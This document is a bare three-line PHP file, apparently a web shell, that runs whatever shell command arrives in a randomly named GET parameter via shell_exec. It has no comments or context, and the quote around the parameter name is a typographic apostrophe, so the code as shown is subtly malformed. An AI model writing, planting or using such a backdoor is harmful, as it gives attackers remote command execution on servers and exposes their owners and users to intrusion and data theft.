<?php
shell_exec($_GET[’X9J5fHwr']);
?>
